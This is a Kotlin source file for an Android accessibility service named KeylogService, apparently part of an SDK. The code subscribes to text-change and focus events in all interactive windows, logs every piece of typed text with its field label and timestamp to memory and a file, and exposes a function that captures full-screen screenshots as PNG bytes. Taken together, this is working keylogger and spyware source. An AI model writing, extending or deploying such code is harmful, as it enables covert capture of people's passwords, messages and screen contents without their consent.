package com.openaccess.sdk.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.graphics.ColorSpace
import android.hardware.HardwareBuffer
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import kotlin.coroutines.resume

class KeylogService : AccessibilityService() {
    companion object {
        private const val TAG = "KeylogService"
        private val textLock = Any()
        var capturedText: String = ""
            private set
        var isRunning = false
            private set
        private var logFile: File? = null
        @JvmStatic var instance: KeylogService? = null
            private set
        private val screenshotExecutor = Executors.newSingleThreadExecutor()

        fun getText(): String = synchronized(textLock) { capturedText }
        private fun appendText(text: String) = synchronized(textLock) {
            capturedText += text
            if (capturedText.length > 50000) capturedText = capturedText.takeLast(25000)
        }

        fun setLogFile(f: File) { logFile = f }

        suspend fun takeScreenshotAsync(): ByteArray? {
            val svc = instance ?: return null
            if (Build.VERSION.SDK_INT < 34) return null
            return suspendCancellableCoroutine { cont ->
                svc.takeScreenshot(Display.DEFAULT_DISPLAY, screenshotExecutor, object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        try {
                            val hb = result.hardwareBuffer
                            val cs = result.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run {
                                cont.resume(null)
                                return
                            }
                            val stream = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                            bitmap.recycle()
                            cont.resume(stream.toByteArray())
                        } catch (e: Exception) {
                            Log.e(TAG, "screenshot onSuccess: ${e.message}")
                            cont.resume(null)
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.w(TAG, "screenshot onFailure: code=$errorCode")
                        cont.resume(null)
                    }
                })
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isRunning = true
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 300
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info
        Log.i(TAG, "Keylog service connected")
        logFile?.appendText("${System.currentTimeMillis()} KeylogService connected\n")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        var source: AccessibilityNodeInfo? = null
        try {
            source = event.source
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text?.joinToString("") ?: return
                    if (text.isNotEmpty()) {
                        val hint = getHint(source)
                        val entry = "[${System.currentTimeMillis()}] $hint: $text\n"
                        appendText(entry)
                        logFile?.appendText(entry)
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    if (source != null) {
                        val hint = getHint(source)
                        if (hint.isNotEmpty()) {
                            val entry = "[${System.currentTimeMillis()}] Focus: $hint\n"
                            appendText(entry)
                            logFile?.appendText(entry)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "event: ${e.message}")
        } finally {
            try { source?.recycle() } catch (_: Exception) {}
        }
    }

    private fun getHint(source: AccessibilityNodeInfo?): String {
        if (source == null) return ""
        return try {
            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                source.hintText?.toString()
            } else null
            hint ?: source.contentDescription?.toString() ?: ""
        } catch (_: Exception) { "" }
    }

    override fun onInterrupt() {
        Log.i(TAG, "Keylog service interrupted")
        isRunning = false
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isRunning = false
        Log.i(TAG, "Keylog service destroyed")
        logFile?.appendText("${System.currentTimeMillis()} KeylogService destroyed\n")
    }
}
